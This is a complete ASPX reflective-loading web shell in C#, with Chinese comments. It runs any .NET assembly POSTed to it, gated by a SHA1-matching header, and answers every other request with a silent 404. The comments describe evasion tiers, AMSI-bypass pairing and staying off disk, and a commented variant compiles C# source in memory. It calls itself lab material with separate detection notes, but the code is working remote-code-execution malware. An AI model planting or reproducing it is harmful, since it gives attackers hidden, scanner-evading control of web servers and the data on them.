<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
/**
 * ASPX 反射加载马（完整实现 / 本地实验环境）
 *
 * ── 形态谱系（免杀梯度）──
 *   ① 关键字变形马：函数名拼接——免杀弱
 *   ② 反射加载马（本实现）：Assembly.Load(byte[]) 内存加载——页面零命令关键词
 *   ③ IHttpModule 内存马：衔接 08 无文件驻留
 *   ④ 与 02 AMSI 上下文破坏联合：脚本层扫描失效后本马静态侧几乎零检出
 *
 * ── 通讯协议 ──
 *   请求：POST 本文件
 *     Header  X-K = SHA1(程序集字节) 十六进制（大写）—— 请求-体绑定校验
 *     Body    = Base64( .NET 程序集字节 )          ← Assembly.Load 主路线
 *     Header  X-A = 可选执行参数（有则调 P.Run(string)，无则调 P.Run()）
 *   执行体契约：程序集内类型 P，公开静态方法 Run() / Run(string)
 *
 * ── 免杀面 ──
 *   1) 静态：页面零命令关键词，只有反射与哈希校验（贴近框架代码）
 *   2) 载荷不落盘：程序集整体内存加载，磁盘无 .dll 残影
 *   3) 绑定校验：X-K 须等于 payload 哈希——无载荷的扫描器探针无法伪造 → 一律 404 静默
 *
 * 检测侧配对见 NOTES.md；仅本地实验环境使用
 */
void Silent(int code) {
    Response.StatusCode = code;
    Response.SuppressContent = true;        // 空响应体（静默）
    Response.End();
}

void Page_Load(object sender, EventArgs e) {
    // ── 1. 触发面：仅 POST + 必须携带 X-K 校验头 ──
    if (!string.Equals(Request.HttpMethod, "POST", StringComparison.OrdinalIgnoreCase)
        || string.IsNullOrEmpty(Request.Headers["X-K"])) { Silent(404); }

    try {
        // ── 2. 载荷读取 + 绑定校验（X-K = SHA1(payload) 大写十六进制）──
        string b64 = new StreamReader(Request.InputStream).ReadToEnd().Trim();
        byte[] asm = Convert.FromBase64String(b64);              // 坏 b64 → 静默

        string h = BitConverter.ToString(SHA1.Create().ComputeHash(asm)).Replace("-", "");
        if (!h.Equals(Request.Headers["X-K"], StringComparison.OrdinalIgnoreCase)) {
            Silent(404);                                         // 绑定校验失败 → 404
        }

        // ── 3. 主路线：Assembly.Load(byte[]) —— 非磁盘来源加载 ──
        //    检测侧：.NET 遥测中程序集来源非镜像文件 = 本步主特征（与 02 AMSI 联合见 NOTES）
        Assembly a = Assembly.Load(asm);

        // ── 4. 反射取执行体：契约类型 P、静态方法 Run ──
        Type t = a.GetType("P");
        if (t == null) { Silent(404); }

        string arg = Request.Headers["X-A"];
        object r = (arg == null)
            ? t.GetMethod("Run", Type.EmptyTypes).Invoke(null, null)
            : t.GetMethod("Run", new[] { typeof(string) }).Invoke(null, new object[] { arg });
        Response.Write(r == null ? "" : r.ToString());
    } catch (ThreadAbortException) {
        throw;                                  // Response.End 的中断信号放行，不吞
    } catch (Exception) {
        Silent(404);                            // 任何异常 → 404 静默（不泄漏类型/栈）
    }
}
</script>
<%--
 ── 变体 B：DLR 动态编译（CSharpCodeProvider / CodeDom，注释保留参考）──
 需求：.NET Framework 全框架（CodeDom 可用）；.NET Core 需另引
 Microsoft.CodeDom.Providers.DotNetCompilerPlatform。
 行为：Base64 还原出 C# 源码 → 编译进内存程序集
 （GenerateInMemory=false 时落临时 DLL → 磁盘特征）。
 页面顶部需补：<%@ Import Namespace="Microsoft.CSharp" %>
              <%@ Import Namespace="System.CodeDom.Compiler" %>

   string src = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(b64));
   using (var p = CodeDomProvider.CreateProvider("CSharp")) {
       var prm = new CompilerParameters(
           new[] { "System.dll", "System.Web.dll" }) {
           GenerateInMemory = true, GenerateExecutable = false
       };
       CompilerResults res = p.CompileAssemblyFromSource(prm, src);
       if (res.Errors.HasErrors) { Silent(404); }
       object r = res.CompiledAssembly.GetType("P").GetMethod("Run").Invoke(null, null);
       Response.Write(r);
   }

 与主路线对比：DLR 变体兼容性差、特征函数多（CompileAssemblyFromSource）、
 拉起 csc.exe 编译进程 = 进程链检测点；主路线 Assembly.Load(byte[]) 更隐蔽。
--%>
